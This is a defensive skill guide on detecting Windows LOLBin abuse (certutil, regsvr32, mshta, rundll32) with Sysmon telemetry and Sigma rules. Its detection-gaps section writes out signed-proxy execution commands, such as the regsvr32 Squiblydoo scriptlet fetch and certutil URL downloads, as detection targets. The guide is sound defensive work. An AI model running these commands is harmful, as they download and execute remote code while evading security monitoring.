---
name: detecting-living-off-the-land-with-lolbas
description: Detect Living Off the Land Binaries (LOLBins/LOLBAS) abuse including certutil, regsvr32, mshta, and rundll32
  via process telemetry, Sigma rules, and parent-child process analysis
domain: cybersecurity
subdomain: threat-detection
tags:
- lolbas
- lolbins
- sigma-rules
- process-monitoring
- sysmon
- endpoint-detection
- threat-hunting
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
d3fend_techniques:
- Executable Denylisting
- Execution Isolation
- File Metadata Consistency Validation
- Application Protocol Command Analysis
- Content Format Conversion
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
---

# Detecting Living Off the Land with LOLBAS

## Overview

Living Off the Land Binaries, Scripts, and Libraries (LOLBAS) are legitimate system utilities abused by attackers to execute malicious actions while evading detection. This skill covers detecting abuse of certutil.exe, regsvr32.exe, mshta.exe, rundll32.exe, msbuild.exe, and other LOLBins using process telemetry from Sysmon and Windows Event Logs, combined with Sigma rule-based detection.


## When to Use

- When investigating security incidents that require detecting living off the land with lolbas
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Detection Gaps & Validation

- **Variants most often missed:** matching on `Image|endswith` (e.g. `\regsvr32.exe`) misses **renamed** LOLBins — key on Sysmon EID 1 `OriginalFileName`/`Description` instead, since Windows EID 4688 has **no OriginalFileName** and renaming defeats it. Signed-proxy execution most often slipped past: `regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll` (Squiblydoo, T1218.010), `rundll32` with `javascript:`/UNC DLL (T1218.011), `mshta` inline `vbscript:`/`javascript:` (T1218.005), and `certutil -urlcache -f http` / `-decode` staging (T1105/T1140).
- **False negatives:** ordinal DLL calls (`rundll32 a.dll,#1`), `wmic ... /format:` XSL pulled over HTTP, and caret/quote/env-var obfuscation that breaks literal command-line substring Sigma matches. Parent-spoofing makes a malicious LOLBin appear to descend from a benign signed process.
- **Validate the rule fires:** Atomic Red Team T1218.010, T1218.011, T1218.005, T1105 (certutil), T1127.001 (msbuild inline task). Execute the renamed-binary test and confirm the Sigma rule still hits via `OriginalFileName`; convert rules with `sigma-cli` and test against your SIEM field mapping.
- **FP tuning:** installers, SCCM/Intune, and admin tooling legitimately call regsvr32/rundll32/msiexec — scope alerts to anomalous parents (winword/excel/outlook/wscript/explorer) and to LOLBins making outbound connections; baseline 7 days of clean telemetry before enabling high-severity rules.

## Prerequisites

- Sysmon or Windows Security Event Log (Event ID 4688) with command-line logging enabled
- Sigma rule conversion tool (sigmac or sigma-cli)
- SIEM platform (Splunk, Elastic, or similar) for log ingestion
- Python 3.8+ with pySigma library
- LOLBAS project reference database

## Steps

1. **Establish LOLBin Watchlist** — Build a prioritized list of monitored binaries (certutil, mshta, regsvr32, rundll32, msbuild, installutil, cmstp, wmic, bitsadmin)
2. **Collect Process Telemetry** — Ingest Sysmon Event ID 1 (Process Create) and Windows 4688 events with full command-line capture
3. **Build Sigma Detection Rules** — Create Sigma rules matching suspicious command-line arguments, network activity, and parent-child process anomalies for each LOLBin
4. **Analyze Parent-Child Relationships** — Flag unexpected parent processes spawning LOLBins (e.g., Excel spawning certutil, Word spawning mshta)
5. **Score and Prioritize Alerts** — Apply risk scoring based on argument anomaly, parent process, execution path, and network indicators
6. **Generate Detection Report** — Produce a structured report of all LOLBin abuse detections with MITRE ATT&CK mapping

## Expected Output

- JSON report listing detected LOLBin abuse events with severity scores
- MITRE ATT&CK technique mapping for each detection (T1218, T1105, T1140, T1127)
- Parent-child process anomaly analysis
- Sigma rule match details with raw event data
